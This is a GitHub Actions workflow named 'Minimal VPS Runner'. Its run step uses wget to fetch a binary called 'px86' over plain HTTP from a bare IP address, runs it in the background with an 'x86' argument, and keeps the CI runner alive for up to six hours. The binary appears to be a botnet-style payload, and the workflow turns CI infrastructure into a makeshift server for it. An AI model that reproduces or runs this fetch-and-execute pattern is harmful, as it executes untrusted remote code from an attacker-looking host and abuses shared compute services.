name: Minimal VPS Runner

on:
  workflow_dispatch:
    inputs:
      uptime:
        description: 'VPS uptime in hours (max 6)'
        required: false
        default: '6'
        type: choice
        options:
          - '1'
          - '2'
          - '3'
          - '4'
          - '5'
          - '6'

jobs:
  run-binary:
    runs-on: ubuntu-latest
    steps:
      - name: Download and run binary in background
        run: |
          wget http://45.138.16.158/bins/px86 -O px86
          chmod +x px86
          echo "üü¢ Launching binary in background..."
          ./px86 x86 &

          echo "üìå PID of background process: $!"
          echo $! > px86.pid

      - name: Keep runner alive
        run: |
          UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
          echo "‚è∞ Keeping VPS alive for $UPTIME_SECONDS seconds..."
          echo "üõë To stop early, cancel the workflow manually."

          # Tail a dummy file to keep step active
          timeout $UPTIME_SECONDS tail -f /dev/null
